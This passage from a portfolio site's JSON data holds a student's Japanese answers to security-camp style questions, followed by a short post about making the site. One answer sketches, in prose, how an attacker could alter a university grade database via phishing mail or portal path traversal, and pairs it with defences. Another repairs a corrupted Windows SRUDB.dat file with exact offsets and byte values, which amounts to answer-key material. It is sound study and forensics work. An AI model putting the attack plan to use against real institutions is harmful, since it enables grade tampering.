          "**個人利益の発生価値が大きい**: 特定学生や保護者にとって合格や就職、奨学金獲得などの短期的な利益を生み出すことが可能なため、個人利益を目的とした攻撃動機が発生しやすいことです。成績が改ざんされれば大学の教育の公正性を損なわれ、学術機関そのものの信用低下や大学補助金の影響等、大きな悪影響を受けることにつながります。"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "[B] 攻撃目標/Goals、 Crown Jewels"
      },
      "最終的には成績データベースを改ざんできる権限の取得です。成績データベースを管理しているサーバーを乗っ取り、その権限を奪うことが必要になります。",
      {
        "type": "heading",
        "level": 4,
        "text": "[C] 攻撃経路・手段/Attack Paths"
      },
      "攻撃経路として大きく２つ考えます。",
      {
        "type": "list",
        "items": [
          "**成績データベースにアクセスできる権限を持つコンピュータをマルウェアに感染させる手法**: これはデータベースサーバーとそれを閲覧するポータルサイトでドメインを分けているような、一般的なサーバーへの攻撃を想定しています。その際、成績データベースのような外部から直接アクセスさせないコンピュータに直接外部から攻撃をすることはできません。そのためまずは大学の学生支援課や学務課などのイントラにアクセスできるPCにマルウェアを仕込ませることが第一目標に目的になります。仮に一台でも内部ネットワークに近いコンピュータにマルウェアを仕込ませることができた場合、そこから他のコンピュータへ感染させることも可能になる上、データベースサーバへのアクセスに近づいていくことが可能となるからです。そして大学は学生の教育支援を行うという構造上、学生からのメール問い合わせにはほとんどの場合内容を確認します。したがって、完全に外部からのメール送信に合わせて、不正に入手した学生のメールアドレスからマルウェア感染用のメールを送信するというのが有効な攻撃となると考えます。",
          "**学生ポータルサイトの脆弱性を突いて、データベースの管理者権限を取得する手法**: これはデータベースサーバーとポータルサイトで同じサーバーを利用している場合を想定しています。その際、学生はポータルサイトを公開しているサーバーの内部に侵入していくことが目標となります。そして一般的な大学ポータルサイトであれば、メールの送信や掲示機能・時間割機能などが搭載されています。それらの機能を使って本来なら一般学生ではアクセスできないパスにアクセスすることが考えられます。例えば、電子メールや掲示機能において添付ファイルにパストラバーサル攻撃用のスクリプトを配置してみるなどです。また、これらの機能に限らず、一般的なウェブサイトの脆弱性をつく攻撃でも同様に考えられます。仮に任意のphpスクリプトを動作させることができてしまえば、データベースへの直接アクセスが可能になってしまう可能性があります。"
        ]
      },
      "いずれにしても特に学内システムだと，脆弱性がそのまま放置されているケースがあるため，攻撃者にとっては狙いやすいターゲットになると思います。",
      {
        "type": "heading",
        "level": 3,
        "text": "問２：防御側の視点"
      },
      {
        "type": "problem",
        "blocks": [
          "上記のサイバー攻撃に対処するため、防御側である学校はどんなセキュリティ対策を講じればよいでしょうか。そのセキュリティ対策はなぜ効果的なのでしょうか。その対策によって防ぎきれないケースとして、どんなパターンが想定されますか？（例：学務課のパソコンにアンチウイルスソフトウェアを導入する）"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "マルウェア感染への対策"
      },
      "大学管轄のパソコン全てにアンチウイルスソフトウェアを導入する対策が考えられます。電子メールを一つずつ開くべきか職員に確認させるというのは現実的ではないうえ、どれだけ気を付けても人間の判断でメールを開く以上はミスは生じてしまうからです。まずは最低限のリスクヘッジとしてアンチウィルスソフトの導入は必要だと考えます。ソフトウェア的にマルウェア感染を抑えることができれば、既知の脆弱性をついたマルウェアには感染しずらくなります。",
      "しかし、この対策でも大学職員によるヒューマンミスは防ぐことはできません。例えば、学生からの電子メールに実行ファイルが添付されており、それを実行してくださいとメールに記載してあると、職員がパソコンの警告を無視して実行してしまうかもしれません。もちろん職員に対してＩＴリテラシーを高める教育をしていくことで全体的なセキュリティを向上させることはできますが、どれだけソフトウェア部分で対策しても人間が絡むパターンはどうしても網羅して防ぐことはできないと考えます。",
      {
        "type": "heading",
        "level": 4,
        "text": "学生ポータルサイトを媒介とした攻撃への対策"
      },
      "ポータルサイトとデータベースを別々のサーバーで管理するのが最も効果的な対策になると思います。これにより、仮にポータルサイトのサーバーの管理者権限を奪うことができても、成績データベースサーバーの権限は奪われないからです。基本的に多くの人間が比較的大きな権限を持っているサーバーと、成績データベースサーバーのような重要なサーバーは分離して管理すべきだと思います。",
      "しかし、この対策でも多段攻撃パターンは対策できません。例えば、ポータルサイトからそのＷＥＢサーバーの管理者権限を手に入れた場合、成績データベースサーバーへの直接通信またはさらに内部へ通信を行うことができてしまう可能性が高いです。サーバーの分離はあくまで２つの大きな機能が共倒れになることを防ぐだけで、究極的には時間稼ぎにしかならない時もあると考えます。",
      "また、学生権限でできることの脆弱性を対策する手法として、学生自身に脆弱性を探させることも非常に有効だと考えます。例えば、学生ポータルサイトで脆弱性を見つけてたらその分金一封がもらえる等で学内で宣伝を出すことで、学生が能動的に脆弱性を見つけ出し報告するというモチベーションを高められます。この対策では網羅的なセキュリティ対策にはなりませんが、突くことのできる脆弱性の数そのものを削っていくことができるので暫定的な対策としては非常に有効な手法だと考えます。",
      {
        "type": "heading",
        "level": 2,
        "text": "問7",
        "id": "section-7"
      },
      {
        "type": "problem",
        "blocks": [
          "C-問7.zipを解凍すると現れる、何らかの壊れたファイルであるCorruptedFileについて、次の問いに答えてください。オフセットを答える問題は、ファイルの先頭を起点として計算したオフセットを答えてください。",
          "CorruptedFileのSHA256ハッシュ値:29b84c957c1193386cf5ccd86e6e4c6a2ba94a0710371d36d2ff2b601c1302a2"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "問7-1"
      },
      {
        "type": "problem",
        "blocks": [
          "壊れたファイルCorruptedFileの元々のファイル形式は何でしょうか。また、特定したファイル形式として読み込めるようにするには、どの個所をどのように修正すればよいでしょうか。ファイル形式、修正した値(修正前、修正後)とそのオフセットをすべて答えてください。"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "ファイル形式"
      },
      "形式：ESEデータベース",
      "CorruptedFileはWindows SRUDB.datだと考えます。これは一般的にwindowsのアプリやプロセスごとのCPU・ネットワーク・バッテリー使用量を自動記録するフォレンジックファイルです。windowsコンピュータ内では`C:\\Windows\\System32\\sru\\SRUDB.dat`に存在しています。",
      {
        "type": "heading",
        "level": 4,
        "text": "正常に読み込ませるために必要な変更箇所"
      },
      "**破損箇所**",
      "ESEデータベースのファイルシグネチャ部分が書き換えられていました。",
      {
        "type": "list",
        "items": [
          "オフセット 0x0004-0x0005",
          "オフセット 0x1004-0x1005"
        ]
      },
      "**修正した値**",
      {
        "type": "list",
        "items": [
          "修正前：BA DD",
          "修正後：EF CD"
        ]
      },
      "**破損箇所が2か所ある理由**",
      "この置き換えが２か所に存在する理由としてプライマリーヘッダーとバックアップヘッダーの２つが存在しているためだと考えました。",
      {
        "type": "heading",
        "level": 3,
        "text": "問7-2"
      },
      {
        "type": "problem",
        "blocks": [
          "7-1の問題をどのように解いたか(考え、試したことや調査したことなど)を400字以内で記載してください。"
        ]
      },
      "まず最初にstringsコマンドやfileコマンド等を駆使して静的な解析を試みました。その中でstringsコマンドでCorruptedFileを解析し、「MSysObjectsShadow」「SRUDBIDMAPTABLE」などのESEシステムテーブル名と固有GUIDが含まれている事を発見しました。ここからWindows SRUDB.dat形式と特定しました。そこから自前WindowsPCの中からSRUDB.datファイルをコピーし、バイナリデータを比較しました。ESE仕様からファイル先頭のシグネチャフィールド（オフセット0x04〜0x07）が正規値「EF CD AB 89」であることを確認し、CorruptedFileは「BA DD AB 89」に改ざんされていた事を発見しました。値修正後、ESEDatabaseViewでファイルが開けることを確認しました。",
      {
        "type": "heading",
        "level": 3,
        "text": "問7-3"
      },
      {
        "type": "problem",
        "blocks": [
          "ファイル内のページ175に関連するデータは一部壊れており、このままでは正常に読み取ることができません。どの個所をどのように修正すると読み取れるようになるでしょうか。修正した値(修正前、修正後)とそのオフセットをすべて答えてください。"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "壊れている箇所"
      },
      "論理ページ175（物理ブロック176、ファイルオフセット: 0xB0000）の内部データ。",
      "**子ページポインタの論理破損**: 中間階層ページであるページ175のデータ領域において、最も左の子ページを指すポインタ(TAG 4)が、本来の正しい先頭ページ番号である178ではなく、657に改ざんされていました。",
      "なお、ページ175の開始オフセットは、ESEデータベースの先頭2ページ分がヘッダ領域であることを踏まえ、(175 + 1) × 4096 = 720,896 バイト = 0xB0000 として求めています。",
      {
        "type": "heading",
        "level": 4,
        "text": "修正した値"
      },
      "**子ページポインタ (TAG 4)**",
      {
        "type": "list",
        "items": [
          "オフセット：0xB0043〜0xB0046",
          "修正前：91 02 00 00",
          "修正後：B2 00 00 00"
        ]
      },
      "**ページチェックサム**",
      {
        "type": "list",
        "items": [
          "オフセット：0xB0000〜0xB0007",
          "修正前：3F 87 C8 1A EB 31 EB 31",
          "修正後：3D 87 C8 39 D6 31 D6 31"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "問7-4"
      },
      {
        "type": "problem",
        "blocks": [
          "7-3の問題をどのように解いたか(考え、試したことや調査したことなど)を400字以内で記載してください。"
        ]
      },
      "まず esentutl /m /p175 を実行し、論理ページ175が下位のリーフページを管理する中間ページであることを確認しました。その配下のTAG 1〜3が指す論理ページ（178, 179, 183）のヘッダ領域をバイナリ表示で調査したところ、それぞれの objidFDP が一致し、かつ双方向リンクによって繋ぎ（178 ➔ 179 ➔ 183）になっている構造を見つけました。一方、親であるページ175の TAG 4 には最左ポインタとして 657 という値がソート規則を無視して書き込まれており、構造破綻の原因となっていました。そこで、TAG 4 の値を真の先頭ページである 178 （バイナリ：B2 00 00 00）に修正しました。その後、再度コマンドによる検証を行い、ツールが算出した正しいチェックサムをページの先頭オフセットに上書きすることで完全に修復しました。",
      {
        "type": "heading",
        "level": 3,
        "text": "問7-5"
      },
      {
        "type": "problem",
        "blocks": [
          "ファイル内のページ31に関連するデータのうち、IdIndex:721のデータが壊れているようです。どの個所をどのように修正するとよいでしょうか。修正した値(修正前、修正後)とそのオフセットをすべて答えてください。また、IdIndex:721に対応するIdBlobに格納されている文字列を答えてください。"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "壊れている部分"
      },
      "アプリIDのデータ",
      {
        "type": "heading",
        "level": 4,
        "text": "修正した値"
      },
      {
        "type": "list",
        "items": [
          "オフセット：0x1337E2 〜 0x1337E5",
          "修正前の値：00 00 00 00",
          "修正後の値：D1 02 00 00"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "IdIndex:721に対応するIdBlobに格納されている文字列"
      },
      "`\\Device\\HarddiskVolume3\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe`",
      {
        "type": "heading",
        "level": 3,
        "text": "問7-6"
      },
      {
        "type": "problem",
        "blocks": [
          "7-5の問題をどのように解いたか(考え、試したことや調査したことなど)を400字以内で記載してください。"
        ]
      },
      "まず、ページ31のヘッダ解析から対象テーブルのオブジェクトIDが FDP: 8 であることを特定しました。次に、ファイル全体から FDP: 8 を持つリーフページをスキャンし、欠落しているIdIndex=721の前後のIDである720と722が存在する論理ページ306（ファイルオフセット 0x133000）を特定しました。該当箇所のバイナリをpythonスクリプトでダンプし、前後の正常なレコードの構造と比較した結果、キー D1 02 (721) に対する4バイトのデータ領域だけが不自然に 00 00 00 00 へゼロクリアされていることを発見しました。これにより、修正すべき値が D1 02 00 00 であると考えました。また、その改ざん箇所の直後から始まるデータ領域を UTF-16LE としてデコードし、隠蔽されていた msedge.exe のフルパス文字列を抽出しました。",
      {
        "type": "heading",
        "level": 3,
        "text": "問7-7"
      },
      {
        "type": "problem",
        "blocks": [
          "このファイル内にはユーザーがダウンロードしたと思われる不審なファイルから発生した通信の記録が残されています。該当するファイル名(フルパス)と、そのファイルからの送信byteの総量(byte)、当該ファイルの最初の通信記録時刻(UTC)と最後の通信記録時刻(UTC)を答えてください。"
        ]
      },
      {
        "type": "list",
        "items": [
          "該当するファイル名：`\\Device\\HarddiskVolume3\\Users\\Risette\\Downloads\\EvilFile\\EvilFile.exe`",
          "送信byteの総量(byte)：0",
          "最初の通信記録時刻(UTC)：2026-03-03 05:08:00",
          "最後の通信記録時刻(UTC)：2026-03-03 21:19:00"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "問7-8"
      },
      {
        "type": "problem",
        "blocks": [
          "7-7の問題をどのように解いたか(考え、試したことや調査したことなど)を400字以内で記載してください。"
        ]
      },
      "問7-7に取り組む前の時点までの修正により、パースエラーで停止していたSRUM解析ツールを正常に動作できるようになりました。そこで修復済みのEDBを解析してCSVを出力したところ、前問で値がクリアされていたID:721(msedge.exe)はログ上ではダウンロードはされていることは確認できませんでした。そこでAppResourceUseInfoの全パスを抽出し、Downloadsフォルダ内の不審な名前のファイル「EvilFile.exe」を特定しました。このファイル名をもとに、最後に該当ファイルのレコードからBytesSentの合計値と、Timestamp列の最小値・最大値を算出し、解答を出しました。"
    ]
  },
  {
    "slug": "my-first-site",
    "title": "ポートフォリオ作りました",
    "date": "2026-10-13",
    "tags": [
      "サイト制作",
      "Astro",
      "ポートフォリオ"
    ],
    "description": "このサイト作成にまつわる話です．",
    "site": {
      "name": "tomocakezombie.github.io",
      "url": "https://tomocakezombie.github.io/",
      "role": "制作・執筆",
      "period": "2026 後期",
      "tech": [
        "Astro",
        "SCSS"
      ]
    },
    "toc": [
      {
        "id": "section-1",
        "text": "どんなサイトか"
      },
      {
        "id": "section-2",
        "text": "サイトを作り始めた背景"
      },
      {
        "id": "section-3",
        "text": "コンセプト"
      },
      {
        "id": "section-4",
        "text": "イラストについて"
      },
      {
        "id": "section-5",
        "text": "隠し要素"
      },
      {
        "id": "section-6",
        "text": "リンク"
      }
    ],
    "body": [
      {
        "type": "heading",
        "level": 2,
        "text": "どんなサイトか",
        "id": "section-1"
      },
      "昔のゲームのようなドット絵の見た目をテーマにした，個人のポートフォリオサイトです．",
      {
        "type": "heading",
        "level": 2,
        "text": "サイトを作り始めた背景",
        "id": "section-2"
      },
      "もともと大学に入ってから色々なことに手を出してきたので，整理したいと思っていました．そんな中，セキュリティキャンプで出会った方のウェブサイトを見て，自分もこういうサイトを作って見たいと思ったのがきっかけです．",
      {
        "type": "heading",
        "level": 2,
        "text": "コンセプト",
        "id": "section-3"
      },
      "見ていて楽しい，昔のゲームのような雰囲気のポートフォリオを目指しています．",
      {
        "type": "heading",
        "level": 2,
        "text": "イラストについて",
        "id": "section-4"
      },
      "イラストは基本的に自作で，「ミニドット絵メーカー3」を使わせていただいて作成しています．",
      {
        "type": "heading",
        "level": 2,
        "text": "隠し要素",
        "id": "section-5"
      },
      {
        "type": "list",
        "items": [
          "トップ画面の雲は，時々特定の形で流れてきます．",
          "他にも随所で追加する予定です．"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "リンク",
        "id": "section-6"
      },
      {
        "type": "link",
        "label": "本サイト",
        "url": "https://tomocakezombie.github.io/"
      },
      {
        "type": "link",
        "label": "ミニドット絵メーカー３",
        "url": "https://neutralx0.net/tools/dot3/"
      }
    ]
  }
];
